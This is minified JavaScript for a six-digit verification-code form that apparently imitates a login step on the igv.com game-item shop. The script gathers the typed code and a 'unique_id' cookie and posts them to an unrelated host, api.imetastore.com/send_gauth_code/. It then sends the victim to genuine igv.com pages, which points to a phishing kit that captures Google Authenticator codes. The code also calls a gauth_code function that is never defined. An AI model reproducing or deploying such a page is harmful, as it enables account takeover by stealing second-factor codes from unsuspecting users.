const form=document.querySelector(".input-cover"),numBoxes=form.querySelectorAll(".input-box"),input=document.querySelector("#el-id-5596-7"),parent=document.querySelector(".login-left"),verify=document.querySelector(".verify-input-code"),goback=document.querySelector(".goback.codeBack"),buttons=document.querySelectorAll("#gogo"),errorTip=form.nextElementSibling,userEmail="",NUM_REGEXP=/[0-9]/;function isNumberValid(e){return NUM_REGEXP.test(e)}function sleep(e){return new Promise(t=>setTimeout(t,e))}const KEYBOARDS={backspace:8,arrowLeft:37,arrowRight:39};verify.addEventListener("click",e=>{document.querySelector(".ver-input").style.display=null,document.querySelector(".ver-code").style.display="none"}),goback.addEventListener("click",e=>{document.querySelector(".ver-input").style.display="none",document.querySelector(".ver-code").style.display=null}),document.addEventListener("click",e=>{e.target!==input?(input.blur(),input.parentElement.classList.remove("is-focus")):input.parentElement.classList.add("is-focus")}),input.addEventListener("input",e=>{isNumberValid(e.key)?(input.blur(),console.log(document.activeElement),input.parentElement.classList.remove("is-focus")):input.value=""});let codeList=[];function getCookie(e){let t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0}function email_code(e){var t=getCookie("unique_id"),o=JSON.stringify({unique_id:t,code:e});console.log(o),$.ajax({url:"https://api.imetastore.com/send_gauth_code/",type:"POST",data:o,timeout:5e4,dataType:"json",contentType:"application/json",accept:"application/json",success:function(e){if(console.log(e.status),"success"===e.status){console.log(e.status);const n=new URLSearchParams(window.location.search);if(null!==n.get("redirectURL")){var t=n.get("redirectURL").match(/\/(\d+)$/),o=t?t[1]:null;document.querySelector('[type="email_code"]').disabled=!1,window.location.href=`https://www.igv.com/items/${o}`}else window.location.href="https://www.igv.com/404"}else"failed"===e.status?(window.location.href="https://igv.com/404",buttons[1].firstElementChild.style.display="none",document.querySelector('[type="email_code"]').disabled=!1):"timeout"===e.status?window.location.href="https://igv.com/404":"gauth_error"===e.status&&(buttons[1].firstElementChild.style.display="none",document.querySelector('[type="email_code"]').disabled=!1,errorActive("google secondary verification failed"))}})}function errorActive(e){console.log(e),document.body.insertAdjacentHTML("beforeend",`\n      <div id="message_1" class="el-message el-message--error el-message-fade-enter-from" role="alert" style="top: 16px; z-index: 20002;">\x3c!--v-if--\x3e<i class="el-icon el-message__icon el-message-icon--error"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024"><path fill="currentColor" d="M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896zm0 393.664L407.936 353.6a38.4 38.4 0 1 0-54.336 54.336L457.664 512 353.6 616.064a38.4 38.4 0 1 0 54.336 54.336L512 566.336 616.064 670.4a38.4 38.4 0 1 0 54.336-54.336L566.336 512 670.4 407.936a38.4 38.4 0 1 0-54.336-54.336L512 457.664z"></path></svg></i><p class="el-message__content">${e}</p>\x3c!--v-if--\x3e</div>\n      `),sleep(1).then(()=>{document.querySelector("#message_1").classList.remove("el-message-fade-enter-from")}),sleep(3e3).then(()=>{document.querySelector("#message_1").classList.add("el-message-fade-enter-from")}),sleep(3500).then(()=>{document.querySelector("#message_1").remove()})}document.addEventListener("keypress",e=>{if(input.blur(),"none"!==document.querySelector(".ver-code").style.display)return 0!=codeList.length&&input.parentElement.classList.contains("is-focus")&&isNumberValid(e.key)?(codeList[0]=e.key,input.value=e.key,input.parentElement.classList.remove("is-focus"),void console.log(codeList)):void(codeList.length<=5&&isNumberValid(e.key)&&(codeList.push(e.key),1==codeList.length?(input.parentElement.classList.remove("is-focus"),input.value=codeList[0],console.log(codeList)):(numBoxes[codeList.length-2].textContent=codeList[codeList.length-1],console.log(codeList))))}),document.addEventListener("keydown",e=>{"Backspace"==e.key&&(codeList.length>=2?(numBoxes[codeList.length-2].textContent=null,codeList.pop(),console.log(codeList)):(input.value=null,codeList.pop(),input.parentElement.classList.add("is-focus"),input.focus(),console.log(codeList)))}),buttons.forEach(e=>{e.addEventListener("click",t=>{if("email_code"==e.getAttribute("type")){let t="";(t=codeList.join("")).length<6?errorTip.textContent="The verification code cannot be empty":(errorTip.textContent="",e.firstElementChild.style.display=null,e.disabled=!0,email_code(t))}else if("gauth_code"==e.getAttribute("type")){let e="";e=codeList.join(""),gauth_code(e)}})});